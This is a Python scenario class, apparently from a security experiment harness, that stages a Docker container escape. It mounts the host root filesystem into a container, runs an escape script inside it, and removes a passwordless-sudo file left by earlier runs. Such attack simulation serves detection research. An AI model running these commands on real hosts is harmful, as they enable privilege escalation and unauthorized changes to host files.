import command_line

class ScenarioB:

    def __init__(self):
        self._name = 'B'

    def getName(self):
        """
        Gets the name of the scenario.
        """
        return self._name

    def registerEvent(self):
        """
        Returns True if scenario requires event to be called, False otherwise.
        """
        return True

    def init(self):
        """
        Setup any resources for the scenario.
        Logging is not active.
        """
        # Start the container for unauthorized writing to host.

        # Clean up any previous attacks
        self.execute( 'sudo rm /etc/sudoers.d/010_testuser-nopasswd' )

        # Start the container
        self.execute( 'docker run -d=true --rm --name ESCAPE_B -v /:/privesc -it attack_b /bin/sh' )

    def start(self):
        """
        May be called multiple times during experiment.
        Logging is active.
        """

    def onEvent(self):
        """
        Event occurred.  For example execute a series of
        commands to carry out an attack.
        """
        # Container Escape and Attack B (modify files from container)
        self.execute( 'docker exec -it ESCAPE_B /privesc/escape.sh' )
        print( 'Scenario ' + self._name + ': Attack started' )

    def stop(self):
        """
        May be called multiple times during experiment.
        Logging is active.
        """

    def destroy(self):
        """
        Tears down the scenario, for example, stop container.
        Logging is not active
        """
        self.execute( 'sudo docker stop ESCAPE_B' )

    def execute( self, command ):
        """
        Convenience to call execute and print out results.
        """
        result = command_line.execute( command )
        for line in result:
            print( 'Scenario ' + self._name + ': ' + line)
